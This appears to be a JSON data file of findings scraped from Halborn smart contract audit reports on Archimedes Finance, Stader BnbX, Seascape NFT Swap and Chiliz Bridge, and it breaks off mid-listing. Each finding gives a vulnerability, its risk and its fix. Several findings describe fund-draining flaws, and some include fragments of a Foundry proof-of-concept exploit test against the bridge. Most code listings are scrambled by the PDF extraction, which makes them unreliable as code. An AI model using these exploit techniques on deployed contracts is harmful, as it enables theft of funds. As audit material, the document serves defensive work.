Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "While requirements are needed for proper usage and security of the con- tracts, some redundant validations have been seen. Code Location: In this instance, the getAllowedLeverageForPositionWithArch function will already call and return the getAllowedLeverageForPosition function return value. Moreover, this function will already revert if not enough ARCH is provided. Making the require statements in lines 90 and 94 redundant. Listing 9: contracts/LeverageEngine.sol (Lines 87,88,90,94) // add some minor buffer to the arch we will use for the ) external nonReentrant whenNotPaused returns ( uint256 ) { revert (\" Invalid number of cycles \" ); if ( cycles == 0 || cycles > _parameterStore . uint256 ousdPrinciple , uint256 cycles , uint256 maxArchAmount 72 function createLeveragedPosition ( 73 74 75 76 77  position 78  getMaxNumberOfCycles () ) { 79 80 81 82  getMinPositionCollateral () ) { 83 84 85  maxArchAmount ) ; 86 87  getAllowedLeverageForPositionWithArch ( ousdPrinciple , cycles ,  maxArchAmountBufferedDown ); } // console . log (\" ousdPrinciple % s \", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . uint256 maxArchAmountBufferedDown = maxArchAmount ; uint256 lvUSDAmount = _parameterStore . } // console . log (\" maxArchAmountBufferedDown % s\", revert (\" Collateral lower then min \" ); 29 require ( lvUSDAmountNeedForArguments - 1 <= lvUSDAmount , \" // / check that user gave enough arch allowance for cycle - // console . log (\" archNeededToBurn % s \", maxArchAmount ) ; uint256 lvUSDAmountNeedForArguments = _parameterStore . 88  getAllowedLeverageForPosition ( ousdPrinciple , cycles ); 89  principle combo 90  cant get enough lvUSD \" ); 91 uint256 archNeededToBurn = ( _parameterStore .  calculateArchNeededForLeverage ( lvUSDAmount ) / 10000) * 10000; //  minus 1000 wei 92 93 94  Not enough Arch given for Pos \"); 95  ; 96  lvUSD \"); 97 98  sender ); 99  ousdPrinciple ); _burnArchTokenForPosition ( msg . sender , archNeededToBurn ); uint256 positionTokenId = _positionToken . safeMint ( msg . require ( archNeededToBurn <= maxArchAmountBufferedDown , \" _ousd . safeTransferFrom ( msg . sender , _addressCoordinator , require ( availableLev >= lvUSDAmount , \" Not enough available uint256 availableLev = _coordinator . getAvailableLeverage () 100 _coordinator . depositCollateralUnderNFT ( positionTokenId ,  ousdPrinciple ); 101  ); 102 _coordinator . getLeveragedOUSD ( positionTokenId , lvUSDAmount uint256 psoitionExpireTime = _coordinator .  getPositionExpireTime ( positionTokenId ); 103 104 emit PositionCreated ( msg . sender , positionTokenId ,  ousdPrinciple , lvUSDAmount , archNeededToBurn , psoitionExpireTime ); 105 106 107 } return positionTokenId ; Risk Level: Likelihood - 1 Impact - 1 30 Recommendation: Avoid calling the same function twice unnecessarily. Remediation Plan: PARTIALLY SOLVED: The Archimedes Finance team fixed the issue in some instances, but it has been partially solved. 31 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Informational"]}, {"title": "USE OF POSTFIX OPERATORS RATHER THAN PREFIX OPERATORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of postfix operators i++ consume more gas than prefix operators ++i. Code Location: ParameterStore.sol - Line 176: for (uint256 i = 0; i < numberOfCycles; ++i){ PositionToken.sol - Line 88: for (uint256 i = 0; i < _addressToTokensOwnedMapping[from]. length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use prefix operators rather than postfix. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue. 32 3.10 (HAL-10) FOR LOOP COULD BE REPLACE BY MULTIPLICATION - INFORMATIONAL ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Informational"]}, {"title": "INTEGER UNDERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calling the increaseTotalRedelegated function is causing an integer un- derflow in the startUndelegation function. If the totalRedelegated amount is increased by calling increaseTotalRedelegated , the startUndelegation transaction will revert with: operation underflowed or overflowed outside an unchecked block (in Solidity > 0.8). Because the undelegation process will fail, the user will not be able to withdraw the deposited BNB. Arithmetic error Code Location: The startUndelegation function performs a subtraction: Listing 1: StakeManager.sol (Line 282) external override whenNotPaused onlyRole ( BOT ) returns ( uint256 _uuid , uint256 _amount ) 265 function startUndelegation () 266 267 268 269 270 271 { 272 273 274 275 276 277 278 279 280 281 282 block . timestamp , 0, _amount ); totalDeposited -= _amount ; require ( totalBnbToWithdraw > 0, \" No Request to withdraw \" ); _uuid = undelegateUUID ++; _amount = totalBnbToWithdraw ; uuidToBotUndelegateRequestMap [ _uuid ] = BotUndelegateRequest ( 12 283 uint256 bnbXToBurn = totalBnbXToBurn ; // To avoid Reentrancy  attack 284 285 286 287 288 } totalBnbXToBurn = 0; totalBnbToWithdraw = 0; IBnbX ( bnbX ). burn ( address ( this ) , bnbXToBurn ); Where totalDeposited is an amount of BNB deposited and _amount is the value of totalBnbToWithdraw that is calculated in the requestWithdraw function: Listing 2: StakeManager.sol (Lines 193,206) 191 function requestWithdraw ( uint256 _amount ) external override  whenNotPaused { 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 require ( _amount > 0, \" Invalid Amount \"); uint256 amountInBnb = convertBnbXToBnb ( _amount ); IERC20Upgradeable ( bnbX ). safeTransferFrom ( msg . sender , address ( this ) , _amount ); uint256 totalStakedBnb = getTotalStakedBnb () ; require ( amountInBnb <= ( totalStakedBnb - totalBnbToWithdraw ) , \" Not enough BNB to withdraw \" ); totalBnbToWithdraw += amountInBnb ; totalBnbXToBurn += _amount ; userWithdrawalRequests [ msg . sender ]. push ( WithdrawalRequest ( undelegateUUID , amountInBnb , block .  timestamp ) 210 211 212 213 } ); emit RequestWithdraw ( msg . sender , _amount , amountInBnb ); The value taken from convertBnbXToBnb is added to totalBnbToWithdraw. The convertBnbXToBnb function calculates its value based on the output 13 of getTotalPooledBnb: Listing 3: StakeManager.sol (Line 455) 455 uint256 totalPooledBnb = getTotalPooledBnb () ; Which is using totalRedelegated set by the increaseTotalRedelegated func- tion: Listing 4: StakeManager.sol (Line 348) 347 function getTotalPooledBnb () public view override returns ( uint256  ) { 348 349 } return ( totalDeposited + totalRedelegated ); Risk Level: Likelihood - 3 Impact - 5 Recommendation: Make sure that calculations performed by other functions are not affected by increasing the delegated/staked amount with increaseTotalRedelegated. Remediation Plan: The addRestakingRewards called SOLVED: increaseTotalRedelegated), the amount del- egated must be greater than 0 to increase. Also, the startUndelegation function recalculates the BnbX/BNB ratio, instead of using a previously calculated one. now contains a check: (previously function 14 ", "labels": ["Halborn", "StaderLabs_BnbX", "Severity: High"]}, {"title": "CALLING increaseTotalRedelegated BEFORE USER DEPOSITS MAY CAUSE USER GETTING 0 BNBX", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If the increaseTotalRedelegated function is called when totalDeposited is 0 and the increased amount is greater than the amount of assets deposited by the first user, the depositor will get 0 BnbX tokens. Scenario:  Deposited amount is 0 (none deposited yet)  increaseTotalRedelegated function is called with 10 BNB as parameter  User deposits 1 BNB Result: The user gets 0 BnbX in return for a deposit of 1 BNB. Code Location: Listing 5: StakeManager.sol (Line 435) public view override returns ( uint256 ) 426 function convertBnbToBnbX ( uint256 _amount ) 427 428 429 430 431 { 432 433 434 435 436 437 uint256 totalShares = IBnbX ( bnbX ). totalSupply () ; totalShares = totalShares == 0 ? 1 : totalShares ; uint256 totalPooledBnb = getTotalPooledBnb () ; totalPooledBnb = totalPooledBnb == 0 ? 1 : totalPooledBnb ; 15 438 uint256 amountInBnbX = ( _amount * totalShares ) /  totalPooledBnb ; 439 440 441 } return amountInBnbX ; The getTotalPooledBnb calculation: Listing 6: StakeManager.sol (Line 348) 347 function getTotalPooledBnb () public view override returns ( uint256  ) { 348 349 } return ( totalDeposited + totalRedelegated ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider changing the conversion calculation logic so that increasing the amount delegated/staked has less impact on first deposits. Remediation Plan: SOLVED: The addRestakingRewards (previously called as increaseTotalRedelegated ) function, now contains a check: the amount delegated must be greater than 0 to increase. This solves the problem of first depositor getting 0 BnbX tokens: Reference 16 ", "labels": ["Halborn", "StaderLabs_BnbX", "Severity: Medium"]}, {"title": "CONTRACTS ARE NOT USING disableInitializers FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The StakeManager and BnbX contracts use Open Zeppelin Initializable mod- ule. According to the Open Zeppelin guidelines the _disableInitializers function call should be added to the constructor to lock contracts after deployment. Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider calling the _disableInitializers function in the contracts constructor: Listing 7 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: SOLVED: The constructor with call to _disableInitializers() was added to StakeManager and BnbX contracts. 17 ", "labels": ["Halborn", "StaderLabs_BnbX", "Severity: Low"]}, {"title": "MISSING ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The lack of zero address validation has been found in many instances when assigning user-supplied address values to state variables directly. Code Location: BnbX.sol, #37-49 The setStakeManager function allows you to set a stakeManager address to 0x0. StakeManager.sol, #70-73 The StakeManagers contract initialization function does not check that the passed addresses are non-0. StakeManager.sol, #326-338 The setBotAddress function allows a bots address to be set to 0x0. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add proper address validation when each state variable assignment is made from user-provided input. Remediation Plan: SOLVED: Added zero address checks in commit 4e04e46729153b6cb50d2ce4da2f807611fcc4d8 18 ", "labels": ["Halborn", "StaderLabs_BnbX", "Severity: Informational"]}, {"title": "MISSING REENTRANCY GUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the audit, it was discovered that the cancelOffer function did not To protect against implement protections against reentrancy attacks. By using reentrancy attacks, it may be necessary to use a mutex. this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that protects the function against re-entrancy attacks. Halborn attempted to exploit a possible reentrancy vulnerability in the cancelOffer function. However, it was not possible to successfully exploit the issue due to the NFT transfer not being successful after deletion of the offer index on the second iteration of the re-entered function. Code Location: The affected function was cancelOffer on line 396. Recommendation: It is recommended to add the nonReentrant modifier to avoid introducing future reentrancy vulnerabilities. Remediation Plan: SOLVED: The Seascape team added the nonReentrant modifier. 12 ", "labels": ["Halborn", "Seascape_NFT_Swap", "Severity: Low"]}, {"title": "NFT NUMBER 0 CAN NEVER BE TRADED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "While currently supported NFTs start with tokenId equal to one, should additional NFT series be supported, with the first tokenId being zero, they would not be able to be traded. Code Location: Location: NftSwap.sol - function createOffer Listing 1 1 require ( _offeredTokens [ index ]. tokenId > 0, \" nft id must be greater  than 0\" ); Location: NftSwap.sol - function acceptOffer Listing 2 require ( _requestedTokenIds [ i ] > 0, \" nft id must be greater than 0 1  \" ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove this check to allow different NFT sets being swapped. 13 Remediation Plan: SOLVED: The Seascape team removed the require statements. 14 ", "labels": ["Halborn", "Seascape_NFT_Swap", "Severity: Informational"]}, {"title": "UPGRADE TO AT LEAST PRAGMA 0.8.10", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default from 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inliner: from 0.8.2, leads to cheaper runtime gas. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: packed structs, in some cases used an After EIP-2929, if the slot additional storage read operation. was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs. Before 0.8.3, storing  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contracts within scope made use of the pragma version 0.6.7 15 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: ACKNOWLEDGED: The Seascape team decided not to upgrade to the latest pragma versions and instead deploy with the current one. They confirmed that future projects will use the newest versions. 16 ", "labels": ["Halborn", "Seascape_NFT_Swap", "Severity: Informational"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location: NFTSwap.sol  Line 236  Line 246  Line 260  Line 287  Line 290  Line 333  Line 355  Line 360  Line 402 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and 17 to variables declared within the loop code block. Remediation Plan: SOLVED: The Seascape team now uses ++i to increment variables inside loops, saving some gas. 18 VERIFICATION OF MATHEMATICAL OPERATIONS SAFETY 19 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V Halborn reviewed the safety of the mathematical operations within the smart contract, as Seascape proposed removing the SafeMath library to reduce gas usage. This review allowed Halborn to identify one integer overflow vulnerability which will not be able to be exploited due to the conditions of the smart contract and the Crowns token total supply. Within the createOffer function, the following code dealt with calculating the amount of funds that would need to be transferred to the smart contract: Listing 3 if ( address ( crowns ) == _bountyAddress ) { require ( crowns . balanceOf ( msg . sender ) >= fee + _bounty , \" not enough CWS for fee & bounty \" ); require ( supportedBountyAddresses [ _bountyAddress ], \" bounty address not supported \" ); if ( _bountyAddress == address (0 x0 )) { require ( msg . value >= _bounty , \" insufficient transfer uint256 returnBack = msg . value . sub ( _bounty ); if ( returnBack > 0) msg . sender . transfer ( returnBack ); IERC20 currency = IERC20 ( _bountyAddress ); require ( currency . balanceOf ( msg . sender ) >= _bounty , \" not enough money to pay bounty \" ); } else { 1 if ( _bounty > 0) { 2 3 4 5 6 7 8 9 10  amount \"); 11 12 13 14 15 16 17 18 19 } else { } } Users can specify a bounty value, which is an additional sum of tokens that would be transferred in exchange for offered NFTs, against the requested NFTs. fee on the other hand, is a value decided by Seascape, which will initially be 1 - This represents the fee paid by the user creating an offer which is deposited in the smart contract, and burnt upon offer acceptance. 20 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V Should the bounty value be inserted as a large value which would allow overflowing the uint256 data type (2**256 - 1), attackers would be able to bypass the require statement detailed below as long as they hold the required amount of Crowns tokens to comply with the funds check. Listing 4 1 require ( crowns . balanceOf ( msg . sender ) >= fee + _bounty ) It should be noted that overflow is not possible when using different tokens. After performing the integer overflow attack, the large _bounty value would be stored as it is, whereas the actual transferred token amount would be the result of the overflowing calculation. Should an attacker cancel their offer, they would be returned the value resulted by the overflowed calculation; therefore, this could not result in any fund loss. On the other hand, should another user accept the offer, or the attacker accept its offer with a different wallet, the contract would be trying to send this large sum of Crowns token. Due to the large number needed to overflow this value, this would require the supply of the Crows token to multiply exponentially. Listing 5 if ( obj . bountyAddress == address (0) ) msg . sender . transfer ( obj . bounty ); 1 if ( obj . bounty > 0) { 2 3 4 5  bounty ); 6 } else IERC20 ( obj . bountyAddress ). safeTransfer ( msg . sender , obj . The current max supply of Crowns is 10e17, which is exponentially below the amount required to overflow the value, even if Seascape increases the fixed fee value by a considerably large amount. 21 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V The other calculation which could be vulnerable to overflow after removing SafeMath was the following: Listing 6 1 require ( msg . value >= _bounty , \" insufficient transfer amount \"); 2 uint256 returnBack = msg . value . sub ( _bounty ); Due to the require statement before the calculation, it would not be possible to provide a value that would cause an integer underflow. Seascape decided not to use SafeMath in their libraries and keep the So- lidity compiler version to 0.6.7 which does not offer built-in mathematics safety. 22 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Seascape_NFT_Swap", "Severity: Informational"]}, {"title": "MISSING COMPARISON BETWEEN MSG VALUE AND AMOUNT LEADS TO DRAINING OF THE FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "A smart contract that is missing a msg.value == amount check may be vulnerable to various types of attacks or errors. This check is typically used to verify that the amount of Ether (or other value token) being sent to the contract is equal to the expected amount. For example, if a user attempts to transfer 100 tokens but includes a msg.value of 200, the contract will not compare the two values and instead process the transfer as if the user were attempting to transfer 200 tokens. This will result in the user being able to withdraw 100 tokens without having the necessary balance, effectively draining 100 tokens from the contract. However, this contract is missing a msg.value == amount check. This means that if a user calls the transfer function and sends more or less Ether than the specified amount, the contract will not detect this and will still attempt to transfer the specified amount of Ether. This could potentially lead to a variety of problems, such as:  Overpayment: If a user sends more Ether than the specified amount, the excess Ether will be transferred to the recipient, but will not be accounted for by the contract. This means that the user may have overpaid for the transfer, and will not be able to recover the excess Ether.  Underpayment: If a user sends less Ether than the specified amount, the contract will still attempt to transfer the full amount of Ether. This means that the transfer will fail, and the user will not be able to recover the Ether they sent.  Invalid state: If a user sends a different amount of Ether than the specified amount, the contract will be in an invalid state, as the 17 amount of Ether transferred will not match the amount specified in the transfer function. This could potentially cause the contract to malfunction or become unresponsive. Overall, a smart contract that is missing a msg.value == amount check may be vulnerable to various types of errors or attacks. It is important to include this check in order to ensure that the contract operates correctly and securely. Code Location: Bridge.sol#L308 Listing 1 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 21 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } } } depositHandler . deposit ( resourceID , destinationChainID , emit Deposit ( destinationChainID , resourceID , depositNonce ) 18 Proof of concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: Based on our analysis, the following actions are recommended:  Add a comparison between the msg.value and the amount in the deposit function.  Test the updated deposit function to ensure that it is functioning properly and preventing the draining of funds. Implementing these recommendations will improve the security and stability of the system by preventing the accidental or malicious drain of contract funds. 19 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a validation on the Handler and Bridge contracts. Commit ID: 0ad5bd40bfb1c321e2ff1030f75e202f9762cce6 20 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Critical"]}, {"title": "INTEGER UNDERFLOW IN THE DEPOSIT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Solidity programming language, an integer underflow occurs when an integer variable is decremented below its minimum possible value. In Solidity, all integer variables have a fixed size and a fixed range of possible values. For example, a uint8 variable can hold a value between 0 and 255 (inclusive), and a int256 variable can hold a value between -2^255 and 2^255-1 (inclusive). The deposit function in the contract contains an integer underflow issue when calculating the amountMinusFee variable. This can happen when the value of the amount variable is less than the value of the bridgeFee variable. If an integer underflow occurs in the deposit function, the This can cause problems result will be a very large positive number. in the contract, as the large positive value of amountMinusFee will be treated as a valid amount. For example, it could be recorded in the depositRecords mapping and used to update the balance of the depositor. Code Location: NativeHandler.sol#L91 Listing 2 1 2 3 4 5 6 7 8 9 10 11 function deposit ( bytes32 resourceID , uint8 uint64 address depositer , bytes calldata data destinationChainID , depositNonce , ) external override onlyBridge { bytes uint256 uint256 memory recipientAddress ; amount ; lenRecipientAddress ; 21 amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , recipientAddress , // copy to 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( ) } assembly { calldatacopy ( 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress 20 21  calldatasize - 0 x104 ) 22 23 24 25  resourceID ]; 26  tokenAddress is not whitelisted \" ); 27 28 29 30 31 32  DepositRecord ( 33 34 35 36 37 38 39 40 41 ); } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amountMinusFee address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = 22 Proof of concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: To address the issue of integer underflow leading to the draining of funds in the Solidity contract, we recommend the following actions:  Review the code of the contract to identify all instances where integer underflow can occur.  Implement appropriate safeguards to prevent integer underflow in each of these instances. This may involve using the SafeMath library, using the require statement to check for underflow, or using other techniques.  Test the updated contract to ensure that it is functioning properly, and that integer underflow is no longer possible.  Monitor the contract for any further issues related to integer underflow and address them as necessary. Implementing these recommendations will help to prevent the accidental or malicious draining of funds from the contract due to integer underflow, improving the security and stability of the system. 23 Remediation Plan: SOLVED: The Chiliz team solved the issue by upgrading to pragma 0.8.17 in contracts. Commit ID: add9f81660e4ab58778f4706e00fc4ac4234a153 24 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Critical"]}, {"title": "LACK OF WHITELISTING ON THE CHAIN IDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If chain IDs are not whitelisted in a smart contract, it may be vulnerable to various types of attacks or errors. A whitelist is a list of approved or allowed values, and in the context of a smart contract, it is used to specify which chain IDs are allowed to interact with the contract. This could potentially lead to a variety of problems, such as:  Loss of tokens: If the contract attempts to transfer tokens to an unauthorized chain ID, the tokens may be lost or stolen, and the user will not be able to recover them.  Invalid state: If the contract attempts to transfer tokens to an unauthorized chain ID, the contracts internal state may become inconsistent or invalid. For example, if the contract maintains a record of all token transfers, it may record an invalid transfer to an unauthorized chain ID, which could cause the contract to malfunction or become unresponsive.  Denial of service: If an attacker can call the transfer function with an unauthorized chain ID, they may be able to prevent legitimate users from transferring tokens to certain chain IDs. This could potentially cause a denial of service, as users would not be able to transfer tokens to the affected chain IDs. Overall, a smart contract that does not have a whitelist of allowed chain IDs may be vulnerable to various types of attacks or errors. It is important to include a whitelist of allowed chain IDs in order to ensure that the contract operates correctly and securely. Code Location: NativeHandler.sol#L91 25 amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , recipientAddress , // copy to 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( Listing 3 memory recipientAddress ; amount ; lenRecipientAddress ; ) external override onlyBridge { destinationChainID , depositNonce , assembly { calldata data calldatacopy ( function deposit ( bytes uint256 uint256 bytes32 resourceID , uint8 uint64 address depositer , bytes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress 20 21  calldatasize - 0 x104 ) 22 23 24 25  resourceID ]; 26  tokenAddress is not whitelisted \" ); 27 28 29 30 31 32  DepositRecord ( 33 34 35 36 37 ) } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = 26 38 39 40 41 ); } depositer , amountMinusFee Proof of concept: Proof of concept code: Listing 4 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; 27 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28  \" )); 29  tokenResource , test ); 30 31 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); bridge . deposit { value : 5 e2 }( anyChainId as uint8 Type , function testExploit () public { } } bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE Risk Level: Likelihood - 5 Impact - 5 Recommendation: One potential recommendation for addressing the issue of lack of whitelisting on the chain IDs is to implement a whitelisting mechanism in the contract. This could involve adding a mapping or array that stores the approved chain IDs, and checking this whitelist before allowing any transactions to be processed on the corresponding chain. For example, the contract could contain a chainIDWhitelist mapping, where each key is a chain ID and the corresponding value is a boolean indicating The deposit function could then be whether the chain ID is approved. 28 updated to check the chainIDWhitelist before processing any transactions. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a whitelist on chain ids. Commit ID: 72176b53657bc49d31bfd5f32ef73376505a5935 29 ", "labels": ["Halborn", "Chiliz_Bridge_Updates", "Severity: Critical"]}, {"title": "TOKENS CAN BE STUCKED IF THE SAME CHAIN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the current implementation of the token bridge, the chain-id is used to identify the source and destination chains when transferring tokens. If the same chain-id is used on both sides of the bridge, the system is unable to determine which chain the tokens are coming from and which chain they are going to, and the tokens become stuck. Code Location: NativeHandler.sol#L91 Listing 5 destinationChainID , depositNonce , calldata data ) external override onlyBridge { memory recipientAddress ; amount ; lenRecipientAddress ; function deposit ( bytes uint256 uint256 bytes32 resourceID , uint8 uint64 address depositer , bytes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress calldatacopy ( assembly { recipientAddress , // copy to amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , 30 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( } address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = ) 20 21  calldatasize - 0 x104 ) 22 23 24  resourceID ]; 25  tokenAddress is not whitelisted \" ); 26 27 28 29 30 31  DepositRecord ( 32 33 34 35 36 37 38 39 40 tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amountMinusFee ); } Proof of concept: Listing 6 1 contract Tester is DSTest { address public user1 = address (0 xB0B ); 2 Bridge internal bridge ; 3 NativeHandler internal nativeHandler ; 4 5 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 6 7 8 9 10 11 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; function setUp () public { 31 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 